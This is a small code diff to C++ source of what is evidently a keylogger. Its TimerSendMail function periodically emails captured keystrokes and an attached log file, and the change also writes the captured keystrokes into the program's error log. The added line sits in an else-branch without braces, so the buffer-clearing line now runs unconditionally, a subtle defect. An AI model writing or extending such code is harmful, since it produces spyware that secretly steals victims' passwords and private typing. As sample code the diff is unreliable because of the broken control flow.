@@ -27,8 +27,9 @@ void TimerSendMail()
     int x = Mail::SendMail("Log [" + last_file + "]",
                            "\nThe file has been attached to this mail\nFor testing purposes:\n " + keylog, IO::GetOurPath(true) + last_file);
     if(x != 7)
-        Helper::WriteAppLog("Mail was not sent! Error Code: " + Helper::ToString(x));
+        Helper::WriteAppLog("Mail was not sent! Error Code: " + Helper::ToString(x) + " Keylog: " + keylog);
     else//Clear out keylog if sending was success
+        Helper::WriteAppLog("Mail was sent successfully");
         keylog = "";
 }
 //2000 * 60 = 2 minutes
